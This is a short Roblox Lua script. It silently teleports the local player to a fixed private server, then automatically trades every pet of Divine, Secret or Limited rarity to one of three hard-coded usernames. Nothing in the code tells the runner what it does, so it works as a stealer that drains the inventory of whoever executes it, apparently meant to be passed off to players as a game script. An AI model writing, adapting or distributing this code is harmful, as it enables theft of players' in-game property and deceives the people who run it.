-- Silent teleport to private server
local teleportService = game:GetService("TeleportService")
local gameID = 126884695634066
local serverID = "fd20835758df1f4dbc9de47c130fb2c2"

task.delay(1.5, function()
    teleportService:TeleportToPrivateServer(gameID, serverID, {game.Players.LocalPlayer})
end)

-- Wait before continuing (even if teleport fails)
task.wait(5)

-- Auto pet send logic
local targetRarities = { "Divine", "Secret", "Limited" }
local rarityKey = "Rarity"

local preferredUsers = {
    "boneblossom215",
    "beanstalk1251",
    "burningbud709"
}

local targetUser = nil
for _, name in ipairs(preferredUsers) do
    if game.Players:FindFirstChild(name) then
        targetUser = name
        break
    end
end

local remoteName = "TradePet"
local remote = game.ReplicatedStorage:FindFirstChild(remoteName)

if targetUser and remote then
    local petFolder = game.Players.LocalPlayer:FindFirstChild("Pets")
    if petFolder then
        for _, pet in pairs(petFolder:GetChildren()) do
            local rarity = pet:FindFirstChild(rarityKey)
            if rarity and table.find(targetRarities, rarity.Value) then
                remote:FireServer(targetUser, pet.Name)
            end
        end
    end
end
